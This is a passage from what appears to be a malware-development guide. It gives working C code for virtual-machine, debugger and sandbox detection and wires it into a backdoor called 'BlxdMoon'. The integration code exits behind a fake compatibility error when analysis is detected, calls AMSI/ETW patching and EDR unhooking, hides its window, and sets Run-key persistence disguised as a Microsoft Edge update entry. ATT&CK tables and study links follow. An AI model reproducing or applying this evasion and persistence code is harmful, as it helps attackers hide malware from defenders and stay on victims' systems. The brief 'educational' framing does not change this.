// include/anti_analysis.h
#ifndef ANTI_ANALYSIS_H
#define ANTI_ANALYSIS_H

#include <windows.h>
#include <intrin.h>
#include <tlhelp32.h>

// ============================================================
// VM Detection Methods
// ============================================================

/**
 * Check for hypervisor using CPUID instruction
 * Bit 31 of ECX (leaf 1) indicates hypervisor presence
 */
BOOL IsVM_CPUID() {
    int cpuInfo[4] = {0};
    __cpuid(cpuInfo, 1);

    // Check hypervisor present bit
    return (cpuInfo[2] >> 31) & 1;
}

/**
 * Check for VM vendor string using CPUID
 * Hypervisors advertise themselves via CPUID leaf 0x40000000
 */
BOOL IsVM_VendorString() {
    int cpuInfo[4] = {0};
    char vendor[13] = {0};

    __cpuid(cpuInfo, 0x40000000);

    // Vendor string is in EBX, ECX, EDX
    memcpy(vendor, &cpuInfo[1], 4);
    memcpy(vendor + 4, &cpuInfo[2], 4);
    memcpy(vendor + 8, &cpuInfo[3], 4);

    // Check for known hypervisor vendors
    const char *vmVendors[] = {
        "VMwareVMware",     // VMware
        "Microsoft Hv",     // Hyper-V
        "VBoxVBoxVBox",     // VirtualBox
        "KVMKVMKVM",        // KVM
        "XenVMMXenVMM",     // Xen
        NULL
    };

    for (int i = 0; vmVendors[i]; i++) {
        if (strcmp(vendor, vmVendors[i]) == 0) {
            return TRUE;
        }
    }

    return FALSE;
}

/**
 * Check for VM-specific registry keys
 */
BOOL IsVM_Registry() {
    const char *vmKeys[] = {
        // VMware
        "SOFTWARE\\VMware, Inc.\\VMware Tools",
        "SYSTEM\\CurrentControlSet\\Services\\vmci",
        "SYSTEM\\CurrentControlSet\\Services\\vmhgfs",

        // VirtualBox
        "SOFTWARE\\Oracle\\VirtualBox Guest Additions",
        "SYSTEM\\CurrentControlSet\\Services\\VBoxGuest",
        "SYSTEM\\CurrentControlSet\\Services\\VBoxMouse",
        "SYSTEM\\CurrentControlSet\\Services\\VBoxSF",

        // Hyper-V
        "SOFTWARE\\Microsoft\\Virtual Machine\\Guest\\Parameters",

        NULL
    };

    HKEY hKey;
    for (int i = 0; vmKeys[i]; i++) {
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, vmKeys[i], 0,
                          KEY_READ, &hKey) == ERROR_SUCCESS) {
            RegCloseKey(hKey);
            return TRUE;
        }
    }

    return FALSE;
}

/**
 * Check for VM-specific processes
 */
BOOL IsVM_Process() {
    const char *vmProcesses[] = {
        // VMware
        "vmtoolsd.exe",
        "vmwaretray.exe",
        "vmwareuser.exe",
        "vmacthlp.exe",

        // VirtualBox
        "VBoxService.exe",
        "VBoxTray.exe",

        // Hyper-V
        "vmcompute.exe",

        // QEMU
        "qemu-ga.exe",

        NULL
    };

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return FALSE;

    PROCESSENTRY32 pe = { sizeof(pe) };
    BOOL found = FALSE;

    if (Process32First(hSnapshot, &pe)) {
        do {
            for (int i = 0; vmProcesses[i]; i++) {
                if (_stricmp(pe.szExeFile, vmProcesses[i]) == 0) {
                    found = TRUE;
                    break;
                }
            }
        } while (!found && Process32Next(hSnapshot, &pe));
    }

    CloseHandle(hSnapshot);
    return found;
}

/**
 * Check for VM-specific hardware (MAC addresses, BIOS, etc.)
 */
BOOL IsVM_Hardware() {
    // Check for VM-specific MAC prefixes
    // VMware: 00:0C:29, 00:50:56
    // VirtualBox: 08:00:27
    // Hyper-V: 00:15:5D

    // This would require network adapter enumeration
    // Simplified check using WMI could also work

    return FALSE;  // Placeholder
}

/**
 * Combined VM detection with scoring
 * Returns TRUE if likely running in a VM
 */
BOOL IsVirtualMachine() {
    int score = 0;

    if (IsVM_CPUID()) score += 3;
    if (IsVM_VendorString()) score += 3;
    if (IsVM_Registry()) score += 2;
    if (IsVM_Process()) score += 2;
    if (IsVM_Hardware()) score += 1;

    // Threshold: 3 or more points indicates VM
    return score >= 3;
}

#endif // ANTI_ANALYSIS_H
```

---

### 4.2 Debugger Detection

**MITRE ATT&CK**: [T1622 - Debugger Evasion](https://attack.mitre.org/techniques/T1622/)

#### Full Implementation

```c
// ============================================================
// Debugger Detection Methods
// ============================================================

/**
 * Check using Windows API (easily bypassed but quick)
 */
BOOL IsDebugger_API() {
    return IsDebuggerPresent();
}

/**
 * Check BeingDebugged flag in PEB directly
 * Bypasses some hook-based evasion of IsDebuggerPresent
 */
BOOL IsDebugger_PEB() {
    #ifdef _WIN64
    // PEB is at offset 0x60 in TEB (GS segment)
    PPEB pPeb = (PPEB)__readgsqword(0x60);
    #else
    // PEB is at offset 0x30 in TEB (FS segment)
    PPEB pPeb = (PPEB)__readfsdword(0x30);
    #endif

    return pPeb->BeingDebugged;
}

/**
 * Check NtGlobalFlag in PEB
 * Debuggers set heap flags that persist in this field
 */
BOOL IsDebugger_NtGlobalFlag() {
    #ifdef _WIN64
    PDWORD pNtGlobalFlag = (PDWORD)(__readgsqword(0x60) + 0xBC);
    #else
    PDWORD pNtGlobalFlag = (PDWORD)(__readfsdword(0x30) + 0x68);
    #endif

    // Debugger heap flags:
    // FLG_HEAP_ENABLE_TAIL_CHECK (0x10)
    // FLG_HEAP_ENABLE_FREE_CHECK (0x20)
    // FLG_HEAP_VALIDATE_PARAMETERS (0x40)
    const DWORD debuggerFlags = 0x70;

    return (*pNtGlobalFlag & debuggerFlags) != 0;
}

/**
 * Check heap flags directly
 * Debuggers modify heap behavior
 */
BOOL IsDebugger_HeapFlags() {
    #ifdef _WIN64
    PPEB pPeb = (PPEB)__readgsqword(0x60);
    PVOID pHeap = *(PVOID*)((BYTE*)pPeb + 0x30);  // ProcessHeap
    DWORD heapFlags = *(DWORD*)((BYTE*)pHeap + 0x70);
    DWORD forceFlags = *(DWORD*)((BYTE*)pHeap + 0x74);
    #else
    PPEB pPeb = (PPEB)__readfsdword(0x30);
    PVOID pHeap = *(PVOID*)((BYTE*)pPeb + 0x18);
    DWORD heapFlags = *(DWORD*)((BYTE*)pHeap + 0x40);
    DWORD forceFlags = *(DWORD*)((BYTE*)pHeap + 0x44);
    #endif

    // Normal values: heapFlags=2, forceFlags=0
    return (heapFlags != 2) || (forceFlags != 0);
}

/**
 * Timing-based detection
 * Stepping through code in a debugger is slow
 */
BOOL IsDebugger_Timing() {
    LARGE_INTEGER freq, start, end;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&start);

    // Simple computation that should be fast
    volatile int x = 0;
    for (int i = 0; i < 1000; i++) {
        x += i;
    }

    QueryPerformanceCounter(&end);

    // Calculate elapsed time in seconds
    double elapsed = (double)(end.QuadPart - start.QuadPart) / freq.QuadPart;

    // If more than 100ms for this simple loop, likely being debugged
    return elapsed > 0.1;
}

/**
 * Check for hardware breakpoints using debug registers
 */
BOOL IsDebugger_HardwareBreakpoints() {
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    if (!GetThreadContext(GetCurrentThread(), &ctx)) {
        return FALSE;
    }

    // Dr0-Dr3 hold breakpoint addresses
    // Any non-zero value indicates a hardware breakpoint
    return (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3);
}

/**
 * Combined debugger detection
 */
BOOL IsDebuggerPresent_Advanced() {
    return IsDebugger_API() ||
           IsDebugger_PEB() ||
           IsDebugger_NtGlobalFlag() ||
           IsDebugger_HeapFlags() ||
           IsDebugger_HardwareBreakpoints() ||
           IsDebugger_Timing();
}
```

---

### 4.3 Sandbox Evasion

**MITRE ATT&CK**: [T1497.001 - System Checks](https://attack.mitre.org/techniques/T1497/001/)

**Sandbox characteristics**: Limited resources, no user activity, fast execution, minimal files.

#### Full Implementation

```c
// ============================================================
// Sandbox Detection Methods
// ============================================================

/**
 * Check system uptime
 * Sandboxes typically have very low uptime (just booted)
 */
BOOL IsSandbox_Uptime() {
    DWORD uptime = GetTickCount();

    // Less than 10 minutes = suspicious
    const DWORD tenMinutes = 10 * 60 * 1000;
    return uptime < tenMinutes;
}

/**
 * Check available memory
 * Sandboxes often have limited RAM (1-4 GB)
 */
BOOL IsSandbox_Memory() {
    MEMORYSTATUSEX mem = { sizeof(mem) };
    GlobalMemoryStatusEx(&mem);

    // Less than 4 GB total RAM = suspicious
    const ULONGLONG fourGB = 4ULL * 1024 * 1024 * 1024;
    return mem.ullTotalPhys < fourGB;
}

/**
 * Check CPU core count
 * Sandboxes often have 1-2 cores
 */
BOOL IsSandbox_CPU() {
    SYSTEM_INFO si;
    GetSystemInfo(&si);

    return si.dwNumberOfProcessors < 2;
}

/**
 * Check disk size
 * Sandboxes often have small disks
 */
BOOL IsSandbox_DiskSize() {
    ULARGE_INTEGER freeBytesAvailable, totalBytes, totalFreeBytes;

    if (GetDiskFreeSpaceExA("C:\\", &freeBytesAvailable,
                             &totalBytes, &totalFreeBytes)) {
        // Less than 60 GB = suspicious
        const ULONGLONG sixtyGB = 60ULL * 1024 * 1024 * 1024;
        return totalBytes.QuadPart < sixtyGB;
    }

    return FALSE;
}

/**
 * Check for recent user activity
 * Real systems have cursor movement, sandboxes often don't
 */
BOOL IsSandbox_NoUserActivity() {
    POINT p1, p2;

    GetCursorPos(&p1);
    Sleep(3000);  // Wait 3 seconds
    GetCursorPos(&p2);

    // No mouse movement = likely sandbox
    return (p1.x == p2.x && p1.y == p2.y);
}

/**
 * Check for user files in common locations
 * Real systems have documents, photos, etc.
 */
BOOL IsSandbox_NoUserFiles() {
    WIN32_FIND_DATAA fd;
    char path[MAX_PATH];

    // Check Documents folder
    ExpandEnvironmentStringsA("%USERPROFILE%\\Documents\\*", path, MAX_PATH);
    HANDLE hFind = FindFirstFileA(path, &fd);

    if (hFind == INVALID_HANDLE_VALUE) {
        return TRUE;  // No Documents folder = suspicious
    }

    int fileCount = 0;
    do {
        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
            fileCount++;
        }
    } while (FindNextFileA(hFind, &fd) && fileCount < 10);

    FindClose(hFind);

    // Less than 5 files = suspicious
    return fileCount < 5;
}

/**
 * Check for common applications
 * Real systems have browsers, Office, etc.
 */
BOOL IsSandbox_NoCommonApps() {
    const char *commonApps[] = {
        "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
        "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe",
        "C:\\Program Files\\Mozilla Firefox\\firefox.exe",
        "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
        NULL
    };

    int foundCount = 0;
    for (int i = 0; commonApps[i]; i++) {
        if (GetFileAttributesA(commonApps[i]) != INVALID_FILE_ATTRIBUTES) {
            foundCount++;
        }
    }

    // No common apps found = suspicious
    return foundCount == 0;
}

/**
 * Check screen resolution
 * Sandboxes often use small/unusual resolutions
 */
BOOL IsSandbox_Resolution() {
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);

    // Unusual resolutions indicate sandbox
    // Common real resolutions: 1920x1080, 2560x1440, 1366x768
    if (width < 1024 || height < 768) return TRUE;
    if (width == 1024 && height == 768) return TRUE;  // Common sandbox default

    return FALSE;
}

/**
 * Combined sandbox detection with weighted scoring
 */
BOOL IsSandbox() {
    int score = 0;

    if (IsSandbox_Uptime()) score += 2;
    if (IsSandbox_Memory()) score += 2;
    if (IsSandbox_CPU()) score += 2;
    if (IsSandbox_DiskSize()) score += 1;
    if (IsSandbox_NoUserFiles()) score += 2;
    if (IsSandbox_NoCommonApps()) score += 1;
    if (IsSandbox_Resolution()) score += 1;
    // Skip NoUserActivity - takes 3 seconds and may be too slow

    // Threshold: 4 or more points indicates sandbox
    return score >= 4;
}
```

---

## Part 5: Integration with BlxdMoon

### 5.1 Evasion Initialization Sequence

Add to `backdoor.c` entry point:

```c
#include "anti_analysis.h"
#include "obfuscate.h"
#include "api_resolve.h"

// Forward declarations for evasion functions
extern BOOL PatchAmsi(void);
extern BOOL PatchEtw(void);
extern BOOL UnhookNtdll(void);

/**
 * Initialize all evasion techniques
 * Call this at the very start before any suspicious activity
 */
BOOL InitEvasion() {
    // Step 1: Anti-analysis checks (exit if analysis environment detected)
    if (IsVirtualMachine() || IsDebuggerPresent_Advanced() || IsSandbox()) {
        // Show fake error and exit cleanly
        MessageBoxA(NULL,
            "This application requires Windows 10 or later.",
            "Compatibility Error",
            MB_OK | MB_ICONERROR);
        return FALSE;
    }

    // Step 2: Disable security telemetry
    PatchAmsi();
    PatchEtw();

    // Step 3: Remove EDR hooks
    UnhookNtdll();

    // Step 4: Initialize dynamic API resolution
    // (Don't use any hooked APIs after this point)

    return TRUE;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                   LPSTR lpCmdLine, int nCmdShow) {

    // Initialize evasion first
    if (!InitEvasion()) {
        return 0;  // Clean exit
    }

    // Now continue with normal backdoor operation...
    HWND stealth = GetConsoleWindow();
    ShowWindow(stealth, 0);

    // ... rest of backdoor code
}
```

### 5.2 Stealthy Persistence

Replace the obvious "Pwnd by BlxdMoon" registry key name:

```c
/**
 * Generate a stealthy, deterministic registry key name
 * Uses computer name hash for uniqueness across machines
 */
char* GetStealthyKeyName() {
    static char keyName[64];

    // Get computer name
    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computerName);
    GetComputerNameA(computerName, &size);

    // Generate hash
    DWORD hash = 5381;
    for (char *p = computerName; *p; p++) {
        hash = ((hash << 5) + hash) + *p;
    }

    // Create innocent-looking key name
    // Looks like a Microsoft update service
    sprintf(keyName, "MicrosoftEdgeUpdate%08X", hash);

    return keyName;
}

/**
 * Modified bootRun function with stealthy persistence
 */
void StealthyPersist() {
    // Decrypt registry path at runtime
    DECRYPT_STRING(regPath, ENC_REG_RUN_KEY, ENC_REG_RUN_KEY_LEN);

    // Get stealthy key name
    char *keyName = GetStealthyKeyName();

    // Get executable path
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);

    // Use dynamically resolved API
    RESOLVE_API(HASH_ADVAPI32_DLL, HASH_REGOPENKEYEXA,
                fn_RegOpenKeyExA, pRegOpenKeyExA);
    RESOLVE_API(HASH_ADVAPI32_DLL, HASH_REGSETVALUEEXA,
                fn_RegSetValueExA, pRegSetValueExA);
    RESOLVE_API(HASH_ADVAPI32_DLL, HASH_REGCLOSEKEY,
                fn_RegCloseKey, pRegCloseKey);

    HKEY hKey;
    if (pRegOpenKeyExA(HKEY_CURRENT_USER, regPath, 0,
                       KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        pRegSetValueExA(hKey, keyName, 0, REG_SZ,
                       (BYTE*)exePath, strlen(exePath) + 1);
        pRegCloseKey(hKey);
    }

    // Clear sensitive strings from memory
    SecureZeroMemory(regPath, sizeof(regPath));
}
```

---

## Part 6: MITRE ATT&CK Reference Table

| Technique | ID | Category | BlxdMoon Implementation |
|-----------|-----|----------|-------------------------|
| Obfuscated Files or Information | [T1027](https://attack.mitre.org/techniques/T1027/) | Defense Evasion | XOR string encryption |
| Dynamic API Resolution | [T1027.007](https://attack.mitre.org/techniques/T1027/007/) | Defense Evasion | API hashing, PEB walking |
| Native API | [T1106](https://attack.mitre.org/techniques/T1106/) | Execution | Direct syscalls |
| Disable or Modify Tools | [T1562.001](https://attack.mitre.org/techniques/T1562/001/) | Defense Evasion | AMSI bypass, ntdll unhooking |
| Indicator Blocking | [T1562.006](https://attack.mitre.org/techniques/T1562/006/) | Defense Evasion | ETW patching |
| Virtualization/Sandbox Evasion | [T1497](https://attack.mitre.org/techniques/T1497/) | Defense Evasion | VM detection |
| System Checks | [T1497.001](https://attack.mitre.org/techniques/T1497/001/) | Defense Evasion | Sandbox evasion |
| Debugger Evasion | [T1622](https://attack.mitre.org/techniques/T1622/) | Defense Evasion | PEB checks, timing |
| Boot or Logon Autostart Execution | [T1547.001](https://attack.mitre.org/techniques/T1547/001/) | Persistence | Registry Run key |
| Hidden Window | [T1564.003](https://attack.mitre.org/techniques/T1564/003/) | Defense Evasion | ShowWindow(stealth, 0) |

---

## Part 7: Real-World Malware References

These malware families use similar techniques (for educational study):

| Malware Family | Techniques Used | MITRE Reference |
|----------------|-----------------|-----------------|
| **Cobalt Strike** | Direct syscalls, Sleep obfuscation, Malleable C2 | [S0154](https://attack.mitre.org/software/S0154/) |
| **Emotet** | API hashing, String obfuscation, Process injection | [S0367](https://attack.mitre.org/software/S0367/) |
| **TrickBot** | Process hollowing, VM detection, Registry persistence | [S0266](https://attack.mitre.org/software/S0266/) |
| **Qakbot** | AMSI bypass, Unhooking, Scheduled tasks | [S0650](https://attack.mitre.org/software/S0650/) |
| **BazarLoader** | Direct syscalls, ETW patching, DLL side-loading | [S0534](https://attack.mitre.org/software/S0534/) |
| **IcedID** | API hashing, Certificate pinning, Web injects | [S0483](https://attack.mitre.org/software/S0483/) |

**Study Resources**:
- MITRE ATT&CK: https://attack.mitre.org/
- VirusTotal Intelligence reports
- Threat intelligence blogs (Mandiant, CrowdStrike, Recorded Future)

---

## References

### Official Documentation
- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [Microsoft Defender Documentation](https://docs.microsoft.com/en-us/microsoft-365/security/defender/)
- [Windows Internals, 7th Edition](https://docs.microsoft.com/en-us/sysinternals/resources/windows-internals)

### Research Papers & Blogs
- [Outflank - Direct Syscalls](https://outflank.nl/blog/)
- [MDSec - ActiveBreach Blog](https://www.mdsec.co.uk/blog/)
- [Elastic Security Labs](https://www.elastic.co/security-labs)

### Open-Source Tools (For Study)
- [SysWhispers](https://github.com/jthuraisamy/SysWhispers) - Syscall stub generation
- [Donut](https://github.com/TheWover/donut) - Shellcode generation
- [Scarecrow](https://github.com/optiv/ScareCrow) - Payload generator

### Training Platforms
- HackTheBox, TryHackMe (legal practice environments)
- SANS SEC504, SEC560 (formal training)
- Sektor7, MalDev Academy (malware development courses)
